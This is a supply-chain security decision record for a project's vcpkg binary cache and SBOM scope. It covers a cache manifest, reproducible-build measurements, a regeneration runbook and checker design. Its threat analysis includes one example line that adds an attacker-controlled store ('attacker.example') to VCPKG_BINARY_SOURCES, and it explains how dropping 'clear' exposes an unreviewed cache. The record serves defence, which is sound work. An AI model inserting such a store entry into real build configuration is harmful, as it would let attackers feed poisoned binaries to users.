# Supply-chain scope — vcpkg binary cache and committed third-party blobs

<!-- tracking-banner: exempt -- a decision record; GitHub Issues remains canonical for anything still open -->

**Status:** part 1 — cache *configuration* is **ENFORCED** (2026-09-14,
`tools/gate/check_vcpkg_binary_sources.py`) and cache *contents* are now
**PINNED** for 7,364 of 7,638 installed files by
`tools/gate/vcpkg_cache_manifest.py`, with a measured, literal 274-file
exclusion list in [`vcpkg-cache-unpinned.json`](vcpkg-cache-unpinned.json).
**ADOPTED** for part 2 (scope statement), whose EXTENSION remains open.

> **Status-line correction, 2026-10-14 (pipeline `p96-open-issues` phase-11).**
> This line read *"cache contents integrity remains ACCEPTED, not fixed"* until
> today, while §2's own body already described the manifest that pins those
> 7,364 files. The body was updated when the manifest landed and the status line
> was not, so the summary a reader sees first said the opposite of the record
> underneath it. Found while establishing what #177 still needs; corrected here
> rather than noted elsewhere, because a stale status line is read far more often
> than the section it summarises.
>
> Two of the exclusion categories now have a partial answer of their own:
> `static-archive` and `self-timestamping-port` are addressed by the normalised
> PE pin in [`pe-normalised-pin-decision.md`](pe-normalised-pin-decision.md)
> (GitHub #298 and #177), which also records what that mechanism does **not**
> cover — 30 of the 36 self-timestamping paths are not installed on the machine
> that generated the pins, and two of the installed DLLs are pinned without their
> nondeterminism being explained.

**Finding:** GitHub #177, recorded in pipeline `backlog-workable-p82` phase-18.
**Owner:** PDFE maintainers.
**Decided:** 2026-09-12 (pipeline `p83-outstanding`, phase 7).
**Re-evaluate by:** 2027-03-12, or sooner if PDFE gains a second build machine
or publishes binaries built anywhere other than the maintainer's own runner.

---

## 1. What #177 asked

Two related gaps, both stated in `docs/security-testing.md` rather than filed
until phase-18:

1. **`VCPKG_BINARY_SOURCES` integrity is unasserted.** PDFE builds from a vcpkg
   binary cache. No test or gate establishes that the binaries installed are the
   ones the manifest and overlay portfiles describe. The dependency lane
   (`dependency-audit.yml` → `scripts/security/run_deps.ps1`) enumerates
   installed packages and checks them for known CVEs; it does not establish
   provenance.
2. **The committed tessdata blobs cannot appear in the SBOM.**
   `tests/fixtures/tessdata/` holds three third-party binaries (`ara`, `eng`,
   `osd` `.traineddata`). The SBOM is produced from the **vcpkg** installed
   tree, so committed fixture binaries are structurally outside it.

---

## 2. Part 1 — binary-cache integrity: ACCEPTED as a risk, not asserted

### Why it matters more than a source build

A poisoned or stale cache entry produces a package that satisfies every version
check while containing something other than the audited source. The *source*
side already has a mechanism — `tools/vcpkg-overlays/{mujs,gumbo}` re-pin
upstream SHA512s and `tools/gate/verify_vcpkg_overlays.py` makes that re-pin
re-derivable (see `vcpkg-overlay-source-verification.md`). The binary side has
none.

### What the cache actually is here

`VCPKG_BINARY_SOURCES` is `clear;files,C:\vcpkg-bincache,readwrite;x-gha,readwrite`
(`windows-sanitizer.yml:166`, and the same shape in the other Windows lanes).
Two stores:

- **`C:\vcpkg-bincache`** — a local directory on the self-hosted runner. Its
  trust boundary is the machine's own filesystem ACL. Anyone who can write there
  can already write to the build tree, the toolchain and the runner's own
  scripts, so a cache-integrity check would not raise the bar: an attacker in
  that position would subvert the check rather than the cache.
- **`x-gha`** — the GitHub Actions cache, scoped to the repository, written only
  by workflow runs of this repository.

### The decision

**Not in scope, and no check is added.** The reasoning, in the order it actually
matters:

1. **The check would not defend against the attacker who can reach the store.**
   For the local cache, write access to `C:\vcpkg-bincache` implies write access
   to everything else the build touches. A hash check run by the same build, on
   the same machine, against a manifest on the same disk, is not a boundary.
2. **The only sound version is expensive and PDFE cannot currently afford it.**
   The real assertion — "a package's installed files hash to what a from-source
   build produces" — requires a from-source build to compare against, i.e.
   building the full dependency set with the cache disabled and diffing. That is
   the thing the cache exists to avoid; on this project's one self-hosted Windows
   runner it is measured in hours, and it would have to run often enough to catch
   a poisoning to be worth anything.
3. **Reproducible builds are the correct fix and are a different project.** If
   PDFE ever needs this property, the answer is bit-reproducible dependency
   builds compared across two independent machines — not a self-check.

This mirrors how `windows-asan-leak-detection-decision.md` handled `detect_leaks`
on the MSVC ASan lane: an explicit accept-and-document beats an unstated gap.

### What would change this

Any of: PDFE publishing binaries built somewhere other than the maintainer's own
runner; the binary cache becoming writable by a party who cannot already write
the build tree; or a second machine existing to compare against. The
re-evaluation date above is the prompt.

### Honest limitation

This is a risk acceptance, not a mitigation. It reduces exposure by exactly
nothing. Its only value is that the gap is now written down where a reviewer can
disagree with it, instead of being absent from both the SBOM and the threat
model.

### Update (2026-09-14, pipeline `p85-remaining-open` phase 2) — the acceptance is NARROWED, not overturned

The three arguments above are about asserting the **contents** of a cache entry,
and they still stand: no hash of a cached package is computed, nothing is
compared against a from-source build, and a poisoned entry inside an approved
store still passes everything this repo runs. **That risk remains accepted.**

What the analysis above did not separate out is that the two cheapest ways to
subvert this cache do not require touching a store at all:

1. **Adding a store.** `VCPKG_BINARY_SOURCES` is an ordered chain. Appending
   `nuget,https://attacker.example/f.json,readwrite` — or `http`, `azblob`,
   `s3`, `gcs` — puts an attacker-controlled store in the chain. It is a
   one-line edit to an env string in a workflow.
2. **Removing `clear`.** Without a leading `clear`, vcpkg keeps its *implicit*
   `default` store, the user-wide archive cache under
   `%LOCALAPPDATA%\vcpkg\archives`. On the self-hosted runner that directory
   persists across jobs, branches and repositories, and nothing reviews it. It
   is a one-word deletion.

Neither is a content-integrity problem, so neither is covered by the reasoning
above; and both are close to invisible in review, because what changes is a
quoted string inside an `env:` block. Argument 1 ("the check would not defend
against the attacker who can reach the store") does not apply to either, since
the attacker here edits a *workflow*, not the store.

**`tools/gate/check_vcpkg_binary_sources.py` now rejects both**, on every push
and PR via `fast-checks.yml`. It parses every workflow's `VCPKG_BINARY_SOURCES`
at any nesting depth, default-denies any store kind outside
`{clear, files, x-gha}`, constrains the `files` store to the one approved
directory, validates the access mode, and requires the leading `clear`. It fails
closed on unreadable or unparseable YAML, on a workflow directory with no
workflows, and — the failure mode this project keeps rediscovering — on finding
**zero** settings, which means the locator broke rather than that the risk went
away. It carries 18 self-tests including one negative case per rule, and the two
headline rules were mutation-verified against a real workflow in the tree.

### Update 2 (2026-09-14, same phase) — the contents gap is now CLOSED, and closing it exposed a worse problem

The paragraph below said contents verification was out of scope. **That is no
longer the position**, because the stated obstacle turned out to be a linker
flag rather than a research problem.

The obstacle was that you cannot pin a checksum to an artifact whose bytes change
every build, and MSVC output is not byte-stable: two identical links of the same
source, measured here, differed in **19 bytes** — a per-link random CodeView GUID
(16) and the wall-clock COFF timestamp (3). `/Brepro` replaces both with
content-derived values. With a deterministic triplet
(`tools/vcpkg-triplets/x64-windows-repro.cmake`), two from-source builds of a
probe set matched **24/24 on every linked artifact**, debug and release.

So `tools/gate/vcpkg_cache_manifest.py` now pins a SHA-256 for every installed
file, generated from a trusted from-source build and verified in the build lane
right after configure. A single flipped byte in a cached DLL is caught by name.
It is **not circular**: the manifest is committed and reviewed, so an attacker
who can write the cache cannot also change the manifest without a pull request.

#### Determinism is 97%, not 100% — and the gap is listed, not hidden

Two full from-source builds of the real dependency set (47 packages, ~2 h each)
under the deterministic triplet:

| | Files |
|---|---|
| Byte-identical | **7,411** |
| Differed | **227** |

The 227 are **not** mysterious. Measured causes:

| Group | Count | Cause |
|---|---:|---|
| `msvc-pdb` | 142 | PDB format embeds build-specific layout. `/Brepro` makes the *image* deterministic, not the symbol file. PDBs are never loaded by the running app. |
| `self-timestamping-port` | 36 | The library stamps *itself*, above the toolchain. Measured in libcrypto: `built on: Tue Sep 15 10:26:06 2026 UTC` is the only meaningful residual after PE normalisation. Also dbus, icu, jpeg-turbo, leptonica. |
| `downstream-sbom` | 24 | vcpkg's SBOM records checksums *of the above*, so it differs as a consequence, not for a reason of its own. |
| `static-archive` | 22 | `lib.exe` has no `/Brepro`; COFF archive members carry timestamps. Import libraries for the deterministic DLLs are unaffected and stay pinned. |
| `build-metadata` | 3 | Generated `.obj` / `.pri` recording build config. |

These are enumerated **literally**, path by path, in
`docs/security/vcpkg-cache-unpinned.json` — deliberately **not** as globs. A rule
like `*.lib` would have unpinned every import library too, and those *are*
deterministic; a literal list cannot widen by accident, and adding to it needs a
reviewed commit naming the file and the reason.

**State the weakness plainly: an unpinned file is not integrity-checked, and
that set includes `libcrypto-3-x64.dll`.** OpenSSL is the highest-value target in
the tree, and it is currently unpinned because it timestamps itself. Closing that
needs the per-port reproducible-builds patch (OpenSSL supports building without
the embedded build date); that is real work and is **not** pretended to be done.
Unpinned files are still required to be **present**, so deletion is caught even
where modification is not.

#### Runbook — when a dependency changes, the manifest must be regenerated

A deliberate dependency change (a vcpkg baseline bump, a new port, a version
pin) changes bytes, so the check will go red. That is correct behaviour, not a
false positive. Regenerate:

```sh
# 1. Build FROM SOURCE. The binary cache must be disabled, or you would be
#    pinning whatever the cache already contained -- i.e. the thing being checked.
VCPKG_BINARY_SOURCES=clear \
VCPKG_OVERLAY_PORTS=$PWD/tools/vcpkg-overlays \
vcpkg install --x-manifest-root=. \
    --overlay-triplets=$PWD/tools/vcpkg-triplets \
    --triplet=x64-windows-repro --host-triplet=x64-windows-repro \
    --x-install-root=build/repro-full/installed

# 2. Regenerate and commit the manifest.
python tools/gate/vcpkg_cache_manifest.py --write \
    --install-root build/repro-full/installed
```

**Do not regenerate from a cache-restored tree.** The checker cannot detect that
you did, because the resulting manifest is perfectly well-formed — it would
simply pin whatever the cache held, silently converting the control into a
tautology. This is the one step where the guard depends on the operator, and it
is called out here for exactly that reason.

> **THE RUNBOOK ABOVE IS NECESSARY BUT NOT SUFFICIENT: `VCPKG_ROOT` IS PART OF
> THE ANSWER (measured 2026-10-03).** A manifest regenerated by following only
> the two steps above can be byte-correct, from-source, cache-free — and still
> fail in CI on every entry, because **the pinned bytes depend on the absolute
> path of the vcpkg buildtrees**.
>
> The triplet neutralises the PDB path with `/PDBALTPATH:%_PDB%`, and its own
> notes say that removes "the variance and the embedded account name". That is
> incomplete. It does not touch `__FILE__`, which assertion macros compile into
> the image as an absolute path. Measured in the tree the runner built on
> 2026-10-03 — 184 of the manifest's entries differed, and a random sample of 10
> showed 4 carrying the build path:
>
> ```
> tesseract55.dll          106 strings: C:\actions-runner\_work\PDFE\PDFE\vcpkg\
>                            buildtrees\tesseract\src\5.5.2-…\src\api\altorenderer.cpp
> qschannelbackendd.dll    144 strings into …\buildtrees\qtbase\src\here-src-6-…
> gmock_main.dll            10 strings into …\buildtrees\gtest\src\v1.17.0-…
> ```
>
> `Qt6Core.dll` and `qpdf30.dll` also differed with NO path string in them, and
> 47 of the changed entries are `vcpkg_abi_info.txt` — which records `cmake`,
> `powershell` and a `triplet_abi` that hashes the compiler. So there are **two**
> independent staleness mechanisms, not one: the build path, and toolchain drift
> since the manifest was generated (2026-09-15).
>
> Therefore, to regenerate a manifest that CI will accept, the build must use the
> same `VCPKG_ROOT` path **and** the same toolchain as the CI job. On the
> self-hosted runner that path is
> `C:\actions-runner\_work\PDFE\PDFE\vcpkg`. The `--x-install-root` in the
> example above is NOT the path that matters — the install root is where files
> land, while the embedded strings come from buildtrees under `VCPKG_ROOT`.
>
> **Two consequences worth separating.** For the control: this manifest cannot be
> regenerated on a developer workstation at all, and will go stale on any
> toolchain update as well as any relocation — it is narrower than
> "deterministic triplet" suggests. For security: these `__FILE__` strings embed
> whatever the build path was, so a build run under a user profile ships the
> account name inside DEPENDENCY DLLs — the same class as this project's
> account-name leak, through a path the triplet's comment describes as closed.
> The current tree is clean (it builds at `C:\actions-runner`, and the sampled
> files contain zero `C:\Users` hits), which is a property of the 2026-10-02
> relocation rather than of the triplet. The durable fix is to strip the prefix
> from `__FILE__` at compile time — MSVC's `/d1trimfile:` — and then re-measure,
> not to assume.

#### The durable fix, and the half of it that is not fixable (2026-10-03)

Both mechanisms above are now addressed, but **not symmetrically**, and the
difference is the point.

**The build path IS fixable, and is fixed.** `x64-windows-repro.cmake` now
passes `/d1trimfile:` for `CURRENT_BUILDTREES_DIR` — in both separator forms,
because the measured strings showed tesseract embedding backslashes and qtbase
forward slashes, so one form would have trimmed only some ports. What survives
in `__FILE__` is `src/<version>-<hash>.clean/...`, still useful in a stack trace
and identical on every machine, because that hash is content-derived.

Measured with a control, on gtest (`gmock_main.dll`, 10 `__FILE__` strings, ~1
minute to build), two from-source builds differing *only* in
`--x-buildtrees-root`:

```
before   pass A  474c43bd…fe19   521728 B   10 path strings
         pass B  df8c8313…4aee   521728 B   10 path strings   -> DIFFERENT
after    pass A  56064527…a724   521216 B    0 path strings
         pass B  56064527…a724   521216 B    0 path strings   -> IDENTICAL
```

The control ran **first**, deliberately: had A and B matched before the flag,
the premise was wrong and there was nothing to fix.

**The toolchain is NOT fixable, and pretending otherwise would be the error.** A
new compiler emits different code, so the bytes differ and *should* be
re-reviewed. No flag changes that. What was genuinely wrong was the
*presentation*: on 2026-10-03 two unrelated mechanisms produced one
undifferentiated wall of 184 `CONTENTS CHANGED` lines, and telling them apart
took a byte-level investigation. So:

* the manifest now records a `toolchain` fingerprint — `triplet_abi` (a hash
  over the triplet files plus the compiler), `cmake`, `powershell` — taken from
  vcpkg's own ABI records, where `triplet_abi` was measured identical across all
  47 ports;
* `--verify` compares it **first** and, on a mismatch, says *the toolchain
  changed and this explains the differences below* before listing any hash. When
  the fingerprint is unchanged it says so too, which is the more interesting
  case: it means a compiler update does **not** explain the diff.

This is an explanation mechanism, not an integrity control. A tamperer editing
those text files to forge a matching fingerprint is still caught by the
binaries, which stay pinned.

**That is also why the 47 `vcpkg_abi_info.txt` files are now unpinned**
(group `toolchain-abi-record`). Their content *is* the toolchain identity the
`toolchain` field now records, so pinning them added no integrity while
guaranteeing 47 spurious failures on every compiler or cmake update. They are
not shipped and not executed, and they remain required to be PRESENT, so
deletion is still caught. 227 → 274 unpinned of 7,638.

**What remains true:** the manifest still has to be regenerated when the
toolchain moves. It no longer has to be regenerated when the build moves, and it
can now be regenerated anywhere — which also closes the account-name hazard
noted above, since `__FILE__` no longer carries the operator's home directory
into dependency binaries.

Reviewing such a commit means reviewing *why* the dependency changed. A manifest
diff with no corresponding `vcpkg.json` / baseline change is the signal worth
stopping on.

#### The finding that fell out of it, which is more serious than the gap it closed

Building PDFE's real dependency set from source on Windows **fails outright**:

```
Downloading https://codeberg.org/ccxvii/mujs/archive/1.3.8.tar.gz
  error: download ... had an unexpected hash
  Expected: b553c09f...ab87
  Actual  : 528cd8a8...c15a6
```

Upstream regenerated the archive, so the registry portfile's pinned SHA-512 no
longer matches the bytes served. `tools/vcpkg-overlays/{mujs,gumbo}` exists
precisely to correct this — but it is wired via `VCPKG_OVERLAY_PORTS` on the
**Linux and macOS lanes only**, and the Windows comment records that the Windows
lane is "unaffected".

**Windows is unaffected only because it never builds mujs — it restores it from
the binary cache.** So the Windows dependency chain is currently *not
rebuildable from its stated sources*, and its continued correctness rests on
cached binaries whose contents nothing verified. That is not a tangent to #177;
it is the strongest possible argument for it. Until this manifest existed, the
one package that could not be re-derived from upstream was also the one nothing
checked.

The from-source build therefore sets `VCPKG_OVERLAY_PORTS` on Windows too. The
overlay pins are themselves guarded by `tools/gate/verify_vcpkg_overlays.py`,
which phase 1 of this pipeline wired in after finding it was invoked by nothing.

---

**Say what the configuration checker is not.** It is *blast-radius bounding*, not
integrity. It asserts that the store set is the reviewed store set. It asserts
nothing whatever about what is inside those stores — that is what the manifest
above now does. Anyone reading "vcpkg binary-cache
integrity is now checked" into that sentence has read too much into it, which is
why the checker's own `PASS` line says so out loud rather than leaving it to a
reader to remember.

The re-evaluation date and the "what would change this" triggers stated earlier
in this section are unchanged — they govern the content-integrity acceptance,
which this update does not touch.

---

## 3. Part 2 — tessdata in the SBOM: ADOPT the scope statement, not the extension

Two options were on the table: extend SBOM generation to cover committed fixture
binaries, or make the SBOM state its own scope so its silence is not read as
absence.

**The scope statement is adopted. The extension is declined for now**, for a
reason that emerged during phase 6 and did not exist when #177 was written:

**The SBOM has a correctness defect of its own — GitHub #181.** It contains 211
packages but only **203 distinct `SPDXID` values**; the id is derived from the
package name alone while the dependency graph carries `hashbrown` at three
versions and six other crates at two. SPDX requires the id to be unique within a
document. Adding three more entries to a document whose id scheme is already
known to collide would be building on a floor that is being replaced.

So the ordering is: fix #181, then extend scope. Doing it in the other order
produces more entries to migrate.

> **Update (2026-09-12, pipeline p84-remaining-open phase 2): #181 is fixed.**
> Element ids are now `SPDXRef-<ecosystem>-<name>-<version>`
> (`scripts/security/gen_sbom.py::spdx_id_for`, mirrored in
> `scripts/security/run_deps.ps1`), each segment reduced to SPDX 2.3's legal
> charset; the regenerated artifact carries **211 packages under 211 distinct
> ids**, and both generators fail closed rather than emit a duplicate.
> `tools/gate/test_gen_sbom_reproducibility.py` asserts zero duplicates in both
> a generated document and the committed one. The floor named above is
> therefore no longer being replaced, and the scope EXTENSION (#177) is
> unblocked — it remains a separate, still-open piece of work, not something
> this change did.

### What the scope statement must say

The SBOM describes **vcpkg dependencies only**. Committed third-party artifacts
— the three `.traineddata` blobs — are inventoried in `THIRD-PARTY-NOTICES.md`
with upstream repo, tag, licence and per-file checksum, and are enforced by
`tools/gate/check_third_party_notices.py`.

That last point is worth stating because the guard was previously reporting
`OK — 9 artifacts attributed` while these three were **not in its table at all**
— a green check over an incomplete inventory. Phase-18 fixed that; the SBOM's
silence is now the *only* remaining place where their absence could be misread.

### Honest limitation

Two inventories that each disagree about what third-party material is present is
a condition that only gets noticed when someone needs it to be right. A scope
statement makes the disagreement *explicit* rather than resolving it. That is an
improvement, and it is not a fix.

---

## 4. What this record does not decide

- Whether the SBOM should eventually be a single inventory covering both vcpkg
  packages and committed binaries. It probably should; that is #181 plus a scope
  extension, and it is not this record's call.
- Anything about the release-asset attachment in GitHub #71, which stays open.
